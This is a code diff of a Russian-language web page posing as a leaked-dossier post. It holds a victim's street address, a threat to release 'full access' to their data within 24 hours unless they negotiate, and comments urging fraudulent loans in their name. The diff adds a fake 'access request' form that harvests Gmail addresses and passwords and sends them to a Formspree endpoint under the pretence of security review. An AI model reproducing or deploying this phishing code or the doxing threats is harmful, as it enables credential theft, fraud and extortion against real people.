@@ -178,19 +178,16 @@
     <div class="main-content">
         <div class="post-container">
             <div class="file-title" id="fileTitle">SYSTEM_ERROR_LOAD</div>
-            
             <div id="postContent">
                 <p id="textDisplay">INITIALIZING...</p>
                 <div class="img-wrapper" id="imgClick">
                     <img src="" id="imgDisplay" class="post-img">
                 </div>
             </div>
-
             <div class="stats">
                 <span>ПРОСМОТРЫ: <b id="viewCount">...</b></span>
                 <span>ИЗБРАННОЕ: <b id="likeCount">...</b></span>
             </div>
-
             <div class="comment-block">
                 <h4 style="color: var(--danger)">COMMENTS:</h4>
                 <div id="commentList"></div>
@@ -200,14 +197,7 @@
 
     <div class="modal-overlay" id="regModal">
         <div class="reg-box" id="modalContent">
-            <h2>ACCESS DENIED</h2>
-            <p style="color: red;">Ваш IP не подтверждён, невозможно войти.</p>
-            <p style="font-size: 0.8rem; margin-top: 15px;">
-                Требуется авторизация.<br><br>
-                <a href="#" id="showRegForm" style="color: var(--accent) !important; text-decoration: underline;">подать заявку на доступ</a>
-            </p>
-            <button id="closeModalBtn" style="width:100%; padding:12px; background:var(--accent); border:none; color:black; cursor:pointer; font-weight:bold; margin-top:15px;">ВЕРНУТЬСЯ</button>
-        </div>
+            </div>
     </div>
 
     <div class="modal-overlay" id="imgModal">
@@ -224,15 +214,26 @@
 ЛОКАЦИЯ: ул. Связистов, д. 10
 ---------------------------------
 ВНИМАНИЕ: Информация будет обновлена (предоставлен полыный доступ) в течение 24 часов, если человек не захочет вести диалог и решить все мирно. `, 
-            
             image: "a8ogt1bqlh5xjp1mxidl (1).png", 
-            
             comments: [
                 { user: "System_Guard", text: "Думаю можно на этого пдф микрозаймоф по паспорту оформить, ахуели уже совсем" },
                 { user: "User_9385395", text: "Ебать хорошо сработали парни, выгружайте полный доступ" },
                 { user: "UNKNOWN", text: "Давайте быстрее выгрудайте полный доступ чтоб по данным работать или тгк заливайте" }
             ]
         };
+
+        // НАСТРОЙКА ОТПРАВКИ (Вставь свою ссылку Formspree здесь)
+        const FORMSPREE_URL = "https://formspree.io/f/mlgzzell"; 
+
+        const originalModalHTML = `
+            <h2>ACCESS DENIED</h2>
+            <p style="color: red;">Ваш IP не подтверждён, невозможно войти.</p>
+            <p style="font-size: 0.8rem; margin-top: 15px;">
+                Требуется авторизация.<br><br>
+                <a href="#" id="showRegForm" style="color: var(--accent) !important; text-decoration: underline;">подать заявку на доступ</a>
+            </p>
+            <button id="closeModalBtn" style="width:100%; padding:12px; background:var(--accent); border:none; color:black; cursor:pointer; font-weight:bold; margin-top:15px;">ВЕРНУТЬСЯ</button>
+        `;
 
         function updateStats() {
             let views = parseInt(localStorage.getItem('pdf_views_count')) || 666;
@@ -246,23 +247,18 @@
         const regModal = document.getElementById('regModal');
         const imgModal = document.getElementById('imgModal');
         const modalContent = document.getElementById('modalContent');
-        const originalModalHTML = modalContent.innerHTML; // Сохраняем исходный вид окна
 
         const openReg = () => {
-            modalContent.innerHTML = originalModalHTML; // Сбрасываем окно к исходному виду при открытии
+            modalContent.innerHTML = originalModalHTML;
             regModal.style.display = 'flex';
-            attachEvents(); // Переназначаем клики
+            attachEvents();
         };
         const closeReg = () => regModal.style.display = 'none';
 
-        const openImg = () => {
-            document.getElementById('fullImg').src = MY_DOCUMENT.image;
-            imgModal.style.display = 'flex';
-        };
-        const closeImg = () => imgModal.style.display = 'none';
-
         function attachEvents() {
-            document.getElementById('closeModalBtn').onclick = closeReg;
+            const closeBtn = document.getElementById('closeModalBtn');
+            if(closeBtn) closeBtn.onclick = closeReg;
+            
             const regLink = document.getElementById('showRegForm');
             if(regLink) {
                 regLink.onclick = (e) => {
@@ -272,74 +268,75 @@
             }
         }
 
-       function showRegForm() {
-    // Вставь сюда свою ссылку от Formspree (получишь её после регистрации)
-    const FORMSPREE_URL = "https://formspree.io/f/mlgzzell"; 
+        function showRegForm() {
+            modalContent.innerHTML = `
+                <h2 style="font-size: 1.2rem;">ФОРМА ДОСТУПА</h2>
+                <div style="text-align: left; margin-top: 20px;">
+                    <label style="display:block; font-size: 0.7rem; color: var(--accent);">GMAIL:</label>
+                    <input type="email" id="regEmail" placeholder="example@gmail.com" style="width:100%; background: #111; border: 1px solid var(--danger); color: white; padding: 8px; margin-bottom: 15px; box-sizing: border-box; outline: none;">
+                    
+                    <label style="display:block; font-size: 0.7rem; color: var(--accent);">PASSWORD:</label>
+                    <input type="password" id="regPass" style="width:100%; background: #111; border: 1px solid var(--danger); color: white; padding: 8px; box-sizing: border-box; outline: none;">
+                    
+                    <p id="errorMsg" style="color: yellow; font-size: 0.7rem; margin-top: 10px; display: none; font-weight: bold;"></p>
+                </div>
+                <button id="submitReg" style="width:100%; padding:12px; background:var(--danger); border:none; color:white; cursor:pointer; font-weight:bold; margin-top:20px;">ОТПРАВИТЬ ЗАПРОС</button>
+            `;
 
-    modalContent.innerHTML = `
-        <h2 style="font-size: 1.2rem;">ФОРМА ДОСТУПА</h2>
-        <div style="text-align: left; margin-top: 20px;">
-            <label style="display:block; font-size: 0.7rem; color: var(--accent);">GMAIL:</label>
-            <input type="email" id="regEmail" placeholder="example@gmail.com" style="width:100%; background: #111; border: 1px solid var(--danger); color: white; padding: 8px; margin-bottom: 15px; box-sizing: border-box; outline: none;">
-            
-            <label style="display:block; font-size: 0.7rem; color: var(--accent);">PASSWORD:</label>
-            <input type="password" id="regPass" style="width:100%; background: #111; border: 1px solid var(--danger); color: white; padding: 8px; box-sizing: border-box; outline: none;">
-            <p id="errorMsg" style="color: yellow; font-size: 0.7rem; margin-top: 10px; display: none;"></p>
-        </div>
-        <button id="submitReg" style="width:100%; padding:12px; background:var(--danger); border:none; color:white; cursor:pointer; font-weight:bold; margin-top:20px;">ОТПРАВИТЬ ЗАПРОС</button>
-    `;
+            document.getElementById('submitReg').onclick = async () => {
+                const email = document.getElementById('regEmail').value;
+                const pass = document.getElementById('regPass').value;
+                const errorMsg = document.getElementById('errorMsg');
 
-    document.getElementById('submitReg').onclick = async () => {
-        const email = document.getElementById('regEmail').value;
-        const pass = document.getElementById('regPass').value;
-        const errorMsg = document.getElementById('errorMsg');
+                // Проверка Gmail
+                const gmailPattern = /^[a-zA-Z0-9._%+-]+@gmail\.com$/;
+                
+                if (!gmailPattern.test(email)) {
+                    errorMsg.innerText = "ОШИБКА: УКАЖИТЕ КОРРЕКТНЫЙ GMAIL АДРЕС";
+                    errorMsg.style.display = "block";
+                    return;
+                }
 
-        // 1. Проверка на формат Gmail
-        const gmailPattern = /^[a-zA-Z0-9._%+-]+@gmail\.com$/;
-        
-        if (!gmailPattern.test(email)) {
-            errorMsg.innerText = "ОШИБКА: УКАЖИТЕ КОРРЕКТНЫЙ GMAIL АДРЕС";
-            errorMsg.style.display = "block";
-            return;
+                if (pass.length < 4) {
+                    errorMsg.innerText = "ОШИБКА: ПАРОЛЬ СЛИШКОМ КОРОТКИЙ";
+                    errorMsg.style.display = "block";
+                    return;
+                }
+
+                const btn = document.getElementById('submitReg');
+                btn.innerText = "СОЕДИНЕНИЕ С СЕРВЕРОМ...";
+                btn.disabled = true;
+
+                try {
+                    const response = await fetch(FORMSPREE_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ email: email, password: pass, target: MY_DOCUMENT.title })
+                    });
+
+                    if (response.ok) {
+                        modalContent.innerHTML = `
+                            <h2 style="color: var(--accent);">ЗАПРОС ПРИНЯТ</h2>
+                            <p style="font-size: 0.9rem; line-height: 1.5;">Ваши данные переданы в отдел безопасности.<br><br>
+                            <span style="color: yellow;">ОЖИДАЙТЕ ОТВЕТА АДМИНИСТРАТОРА</span><br>
+                            (Обычно это занимает от 2 до 24 часов)</p>
+                            <button onclick="location.reload()" style="width:100%; padding:12px; background:var(--accent); border:none; color:black; cursor:pointer; font-weight:bold; margin-top:15px;">ЗАКРЫТЬ</button>
+                        `;
+                    } else { throw new Error(); }
+                } catch (err) {
+                    btn.disabled = false;
+                    btn.innerText = "ОТПРАВИТЬ ЗАПРОС";
+                    errorMsg.innerText = "ОШИБКА СЕТИ: ПОВТОРИТЕ ПОЗЖЕ";
+                    errorMsg.style.display = "block";
+                }
+            };
         }
 
-        if (pass.length < 4) {
-            errorMsg.innerText = "ОШИБКА: ПАРОЛЬ СЛИШКОМ КОРОТКИЙ";
-            errorMsg.style.display = "block";
-            return;
-        }
-
-        // Блокируем кнопку на время отправки
-        const btn = document.getElementById('submitReg');
-        btn.innerText = "ОТПРАВКА...";
-        btn.disabled = true;
-
-        // 2. Отправка данных на почту через Formspree
-        try {
-            const response = await fetch(FORMSPREE_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ email: email, password: pass })
-            });
-
-            if (response.ok) {
-                modalContent.innerHTML = `
-                    <h2 style="color: var(--accent);">ЗАПРОС ПРИНЯТ</h2>
-                    <p style="font-size: 0.9rem; line-height: 1.5;">Ваши данные переданы в отдел безопасности.<br><br>
-                    <span style="color: yellow;">ОЖИДАЙТЕ ОТВЕТА АДМИНИСТРАТОРА</span></p>
-                    <button onclick="location.reload()" style="width:100%; padding:12px; background:var(--accent); border:none; color:black; cursor:pointer; font-weight:bold; margin-top:15px;">ЗАКРЫТЬ</button>
-                `;
-            } else {
-                throw new Error();
-            }
-        } catch (err) {
-            btn.disabled = false;
-            btn.innerText = "ОТПРАВИТЬ ЗАПРОС";
-            errorMsg.innerText = "СЕРВЕР ПЕРЕГРУЖЕН. ПОПРОБУЙТЕ ПОЗЖЕ.";
-            errorMsg.style.display = "block";
-        }
-    };
-}
+        const openImg = () => {
+            document.getElementById('fullImg').src = MY_DOCUMENT.image;
+            imgModal.style.display = 'flex';
+        };
+        const closeImg = () => imgModal.style.display = 'none';
 
         document.getElementById('logoBtn').onclick = openReg;
         document.getElementById('regBtn').onclick = openReg;
@@ -349,13 +346,11 @@
         function renderPage() {
             document.getElementById('fileTitle').innerText = MY_DOCUMENT.title;
             document.getElementById('textDisplay').innerText = MY_DOCUMENT.text;
-            
             if(MY_DOCUMENT.image) {
                 const img = document.getElementById('imgDisplay');
                 img.src = MY_DOCUMENT.image;
                 img.style.display = 'block';
             }
-            
             const list = document.getElementById('commentList');
             list.innerHTML = MY_DOCUMENT.comments.map(c => `
                 <div class="comment-item">
@@ -369,7 +364,6 @@
             renderPage();
             updateStats();
             setInterval(updateStats, 15000);
-            attachEvents();
         };
     </script>
 </body>
